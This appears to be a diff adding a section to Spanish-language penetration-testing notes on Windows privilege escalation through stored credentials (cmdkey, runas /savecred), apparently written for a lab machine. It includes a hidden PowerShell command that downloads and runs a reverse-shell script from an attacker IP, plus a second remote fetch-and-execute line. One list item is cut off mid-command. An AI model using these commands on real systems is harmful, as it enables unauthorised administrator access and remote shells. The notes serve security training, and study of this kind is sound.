@@ -340,3 +340,31 @@ int main() {
 }
 ```
 
+## runas save creds
+- **Detección**: `cmdkey /list`
+
+```powershell
+C:\Users\security\Desktop>cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:interactive=ACCESS\Administrator
+                                                       Type: Domain Password
+    User: ACCESS\Administrator
+    
+
+C:\Users\security\Desktop>
+```
+
+- **Explotación**: `runas /user:ACCESS\Administrator /savecred "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.58/rev.ps1')"`
+    - También podemos hacer: `runas 
+    - **Ejecutar un archivo ejecutable**: `runas /user:ACCESS\Administrator /savecred "C:\path\to\executable.exe"`
+    - **Abrir el símbolo del sistema como administrador**: `runas /user:ACCESS\Administrator /savecred "cmd.exe"`
+    - **Ejecutar un script de PowerShell**: `runas /user:ACCESS\Administrator /savecred "powershell.exe -File C:\path\to\script.ps1"`
+    - **Abrir el Administrador de tareas como administrador**: `runas /user:ACCESS\Administrator /savecred "taskmgr.exe"`
+    - **Ejecutar un programa con argumentos específicos**: `runas /user:ACCESS\Administrator /savecred "notepad.exe C:\path\to\file.txt"`
+    - **Abrir el Editor del Registro**: `runas /user:ACCESS\Administrator /savecred "regedit.exe"`
+    - **Ejecutar un navegador web**: `runas /user:ACCESS\Administrator /savecred "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"`
+    - **Ejecutar un comando en PowerShell interactivo**: `runas /user:ACCESS\Administrator /savecred "powershell.exe -Command Get-Process"`
+    - **Abrir el Explorador de Windows como administrador**: `runas /user:ACCESS\Administrator /savecred "explorer.exe"`
+    - **Ejecutar un script remoto**: `runas /user:ACCESS\Administrator /savecred "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"`
